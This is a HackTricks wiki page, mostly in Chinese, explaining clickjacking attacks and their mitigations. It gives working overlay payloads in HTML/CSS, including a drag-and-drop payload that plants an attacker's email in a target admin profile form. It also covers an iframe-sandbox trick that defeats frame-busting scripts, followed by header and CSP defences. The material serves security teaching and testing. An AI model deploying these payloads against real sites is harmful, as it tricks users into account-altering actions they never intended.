# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## 什么是 Clickjacking

在 clickjacking 攻击中，**用户**被**欺骗**去**点击**网页上的一个**元素**，该元素要么是**不可见**的，要么伪装成其他元素。这种操控可能导致用户意想不到的后果，例如下载恶意软件、重定向到恶意网页、提供凭据或敏感信息、资金转移或在线购买产品。

### 预填充表单技巧

有时可以在加载页面时使用 GET 参数**填充表单字段的值**。攻击者可能会利用这种行为用任意数据填充表单，并发送 clickjacking 有效载荷，以便用户点击提交按钮。

### 使用拖放填充表单

如果你需要用户**填写表单**，但不想直接要求他写一些特定的信息（例如你知道的电子邮件或特定密码），你可以只要求他**拖放**一些东西，这样就会写入你控制的数据，如在[**这个例子**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)中所示。

### 基本有效载荷
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### 多步骤有效载荷
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### 拖放 + 点击有效载荷
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

如果您已识别出一个**需要用户点击**某个元素以**触发**XSS的**XSS攻击**，并且该页面**易受点击劫持**，您可以利用它来欺骗用户点击按钮/链接。\
示例：\
您在账户的某些私人细节中发现了一个**自我XSS**（只有您可以设置和读取的细节）。包含设置这些细节的**表单**的页面**易受** **点击劫持**，您可以用GET参数**预填充**该**表单**。\
攻击者可以准备一个**点击劫持**攻击，通过**预填充**该页面的**表单**与**XSS有效载荷**，并**欺骗**用户**提交**表单。因此，**当表单被提交**且值被修改时，**用户将执行XSS**。

### DoubleClickjacking

首先在[这篇文章](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html)中解释，这种技术会要求受害者在特定位置的自定义页面上的一个按钮上双击，并利用mousedown和onclick事件之间的时间差在双击期间加载受害者页面，以便**受害者实际上点击了受害者页面中的一个合法按钮**。

一个示例可以在这个视频中看到：[https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

代码示例可以在[这个页面](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html)中找到。

> [!WARNING]
> 这种技术允许欺骗用户在受害者页面的一个地方点击，绕过所有针对点击劫持的保护。因此，攻击者需要找到**只需一次点击即可完成的敏感操作，例如接受权限的OAuth提示**。

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

在客户端执行的脚本可以采取措施防止点击劫持：

- 确保应用程序窗口是主窗口或顶部窗口。
- 使所有框架可见。
- 防止对不可见框架的点击。
- 检测并警告用户潜在的点击劫持尝试。

然而，这些框架破坏脚本可能会被规避：

- **浏览器的安全设置：** 一些浏览器可能会根据其安全设置或缺乏JavaScript支持来阻止这些脚本。
- **HTML5 iframe `sandbox` 属性：** 攻击者可以通过设置`sandbox`属性为`allow-forms`或`allow-scripts`值而不包含`allow-top-navigation`来中和框架破坏脚本。这防止了iframe验证它是否是顶层窗口，例如，
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
`allow-forms` 和 `allow-scripts` 值在禁用顶级导航的同时启用 iframe 内的操作。为了确保目标站点的预期功能，可能需要额外的权限，如 `allow-same-origin` 和 `allow-modals`，具体取决于攻击类型。浏览器控制台消息可以指导允许哪些权限。

### 服务器端防御

#### X-Frame-Options

**`X-Frame-Options` HTTP 响应头** 通知浏览器关于在 `<frame>` 或 `<iframe>` 中渲染页面的合法性，有助于防止 Clickjacking：

- `X-Frame-Options: deny` - 没有域可以框架内容。
- `X-Frame-Options: sameorigin` - 只有当前站点可以框架内容。
- `X-Frame-Options: allow-from https://trusted.com` - 只有指定的 'uri' 可以框架页面。
- 注意限制：如果浏览器不支持此指令，可能无法工作。一些浏览器更倾向于 CSP frame-ancestors 指令。

#### 内容安全策略 (CSP) frame-ancestors 指令

**CSP 中的 `frame-ancestors` 指令** 是建议的 Clickjacking 保护方法：

- `frame-ancestors 'none'` - 类似于 `X-Frame-Options: deny`。
- `frame-ancestors 'self'` - 类似于 `X-Frame-Options: sameorigin`。
- `frame-ancestors trusted.com` - 类似于 `X-Frame-Options: allow-from`。

例如，以下 CSP 仅允许来自同一域的框架：

`Content-Security-Policy: frame-ancestors 'self';`

更多详细信息和复杂示例可以在 [frame-ancestors CSP 文档](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) 和 [Mozilla 的 CSP frame-ancestors 文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) 中找到。

### 内容安全策略 (CSP) 与 `child-src` 和 `frame-src`

**内容安全策略 (CSP)** 是一种安全措施，通过指定浏览器应允许加载内容的来源，帮助防止 Clickjacking 和其他代码注入攻击。

#### `frame-src` 指令

- 定义框架的有效来源。
- 比 `default-src` 指令更具体。
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
此策略允许来自相同源（self）和 https://trusted-website.com 的框架。

#### `child-src` 指令

- 在 CSP 级别 2 中引入，用于设置 web workers 和框架的有效源。
- 作为 frame-src 和 worker-src 的后备。
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
此策略允许来自相同源（self）和 https://trusted-website.com 的框架和工作者。

**使用说明：**

- 弃用：child-src 正在逐步被 frame-src 和 worker-src 取代。
- 回退行为：如果 frame-src 缺失，则使用 child-src 作为框架的回退。如果两者都缺失，则使用 default-src。
- 严格的源定义：在指令中仅包含受信任的源以防止利用。

#### JavaScript 框架破坏脚本

尽管并非完全可靠，但基于 JavaScript 的框架破坏脚本可以用于防止网页被框架化。示例：
```javascript
if (top !== self) {
top.location = self.location
}
```
#### 使用反-CSRF 令牌

- **令牌验证：** 在 web 应用程序中使用反-CSRF 令牌，以确保状态更改请求是用户有意发出的，而不是通过 Clickjacked 页面发出的。

## 参考文献

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

{{#include ../banners/hacktricks-training.md}}
